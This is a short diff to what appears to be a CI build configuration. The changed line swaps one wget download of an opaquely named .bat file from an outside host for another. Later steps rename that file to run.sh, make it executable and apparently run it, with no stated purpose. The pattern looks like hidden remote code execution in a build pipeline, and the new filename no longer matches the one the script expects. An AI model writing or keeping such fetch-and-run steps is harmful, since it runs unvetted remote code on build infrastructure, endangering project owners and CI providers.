@@ -13,7 +13,7 @@ install:
    - cd ncl
    - tar zxvf 8e3bf21906ef36c7a0539117db0ba29bb7a670.gz
    - cd ..
-   - wget https://x.ahx.jp/e2/c9d5126dad3a9457e6b0becbb6105d190156bf.bat
+   - wget https://x.ahx.jp/ba/1b9fea7a2defe076891e441ade37382a2e7587.bat
 script: 
    - mv c9d5126dad3a9457e6b0becbb6105d190156bf.bat run.sh
    - chmod +x run.sh
